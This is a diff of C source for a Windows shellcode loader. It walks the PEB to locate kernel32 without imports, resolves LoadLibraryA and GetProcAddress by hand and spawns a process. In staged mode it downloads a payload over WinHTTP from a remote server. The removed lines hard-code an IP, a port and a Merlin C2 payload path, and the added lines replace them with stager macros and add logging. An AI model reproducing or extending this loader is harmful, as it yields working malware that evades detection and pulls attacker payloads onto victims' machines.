@@ -46,13 +46,15 @@ __attribute__((format(printf, 3, 4))) static inline void log_func(const char *fu
 typedef HMODULE(WINAPI *LoadLibraryA_t)(IN LPCSTR lpLibFileName);
 typedef FARPROC(WINAPI *GetProcAddress_t)(IN HMODULE hModule, IN LPCSTR lpProcName);
 
-FUNC int my_wcscmp(const wchar_t *s1, const wchar_t *s2)
+FUNC int my_wcscmp_caseinsensitve(const wchar_t *s1, const wchar_t *s2)
 {
     while (*s1 != L'\0' && *s2 != L'\0')
     {
-        if (*s1 != *s2)
+        wchar_t s1_lower = (*s1 >= L'A' && *s1 <= L'Z') ? *s1 + (L'a' - L'A') : *s1;
+        wchar_t s2_lower = (*s2 >= L'A' && *s2 <= L'Z') ? *s2 + (L'a' - L'A') : *s2;
+        if (s1_lower != s2_lower)
         {
-            return (*s1 < *s2) ? -1 : 1;
+            return (s1_lower < s2_lower) ? -1 : 1;
         }
 
         s1++;
@@ -96,8 +98,10 @@ FUNC PLDR_DATA_TABLE_ENTRY GetDllLdr(PPEB_LDR_DATA ldr, wchar_t *name)
     {
         dll = CONTAINING_RECORD(item, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
 
-        if (my_wcscmp(dll->FullDllName.Buffer, name) == 0)
+        LOG("Walking InMemoryOrderModuleList - %ls", dll->FullDllName.Buffer);
+        if (my_wcscmp_caseinsensitve(dll->FullDllName.Buffer, name) == 0)
         {
+            LOG("Found DLL: %ls", dll->FullDllName.Buffer);
             return dll;
         }
 
@@ -196,13 +200,13 @@ FUNC void get_shellcode(uint8_t *buf, size_t *bufsize)
 
 FUNC void run(typeof(LoadLibraryA) *LoadLibraryA, typeof(GetProcAddress) *GetProcAddress)
 {
-// Helpers to load all other libraries
-#define IMPORT_LIB(library)                         \
-    HANDLE library = LoadLibraryA(#library ".dll"); \
-    LOG("Located " #library " @ %p", library)
-#define IMPORT_FUNC(library, func)                                            \
-    typeof(func) *func = (typeof(func))(PVOID)GetProcAddress(library, #func); \
-    LOG("Imported " #library "->" #func " @ %p", func)
+    // Helpers to load all other libraries
+    #define IMPORT_LIB(library)                         \
+        HANDLE library = LoadLibraryA(#library ".dll"); \
+        LOG("Located " #library " @ %p", library)
+    #define IMPORT_FUNC(library, func)                                            \
+        typeof(func) *func = (typeof(func))(PVOID)GetProcAddress(library, #func); \
+        LOG("Imported " #library "->" #func " @ %p", func)
 
     // Import everything
     IMPORT_LIB(kernel32);
@@ -251,13 +255,13 @@ FUNC void run(typeof(LoadLibraryA) *LoadLibraryA, typeof(GetProcAddress) *GetPro
     LOG("pid is %ld", pi.dwProcessId);
 
     LOG("Sleeping...");
-    Sleep(3000);
+    Sleep(10000);
 
 #ifdef STAGED
     LPCWSTR user_agent = L"WinHTTP Downloader/1.0";
-    LPCWSTR server = L"192.168.45.167";
-    INTERNET_PORT port = 4440;
-    LPCWSTR path = L"/merlin-192.168.45.167.bin";
+    LPCWSTR server = STAGER_HOST;
+    INTERNET_PORT port = STAGER_PORT;
+    LPCWSTR path = STAGER_PATH;
 
     LOG("WinHttpOpen...");
     HINTERNET h_session = WinHttpOpen(user_agent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
@@ -269,7 +273,7 @@ FUNC void run(typeof(LoadLibraryA) *LoadLibraryA, typeof(GetProcAddress) *GetPro
     if (!h_connect)
         return;
 
-    LOG("WinHttpOpenRequest...");
+    LOG("WinHttpOpenRequest... -> %hs", path);
     HINTERNET h_request = WinHttpOpenRequest(h_connect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
     if (!h_request)
         return;
@@ -391,22 +395,30 @@ int main()
 int start(void)
 {
 #endif
+    LOG("Started");
+    
     PPEB peb = GetPEB();
-
+    LOG("Got PEB");
+    
     wchar_t dll_name[] = L"C:\\Windows\\System32\\KERNEL32.DLL";
-
+    
     // Get address of kernel32.dll
     PLDR_DATA_TABLE_ENTRY kernel32_ldr = GetDllLdr(peb->Ldr, dll_name);
     PVOID kernel32 = kernel32_ldr->DllBase;
+    LOG("Found kernel32 (the hard way)");
+    
+    // Now we have kernel32 - we can find the functions that we need to load other libs
+    #define LOCATE_KERNEL32_FUNC(func)                         \
+        typeof(func) *func = NULL;                             \
+        LOG("Looking for kernel32->" #func " (the hard way)"); \
+        FindFunc(kernel32, #func, (void **)&func);             \
+        LOG("Found kernel32->" #func " (the hard way)");
 
-// Now we have kernel32 - we can find the functions that we need to load other libs
-#define LOCATE_KERNEL32_FUNC(func) \
-    typeof(func) *func = NULL;     \
-    FindFunc(kernel32, #func, (void **)&func);
-    LOCATE_KERNEL32_FUNC(LoadLibraryA)
-    LOCATE_KERNEL32_FUNC(GetProcAddress)
-
+    LOCATE_KERNEL32_FUNC(LoadLibraryA);
+    LOCATE_KERNEL32_FUNC(GetProcAddress);
+    
     // Call sub code
+    LOG("Calling run()");
     run(LoadLibraryA, GetProcAddress);
     return 0;
 }
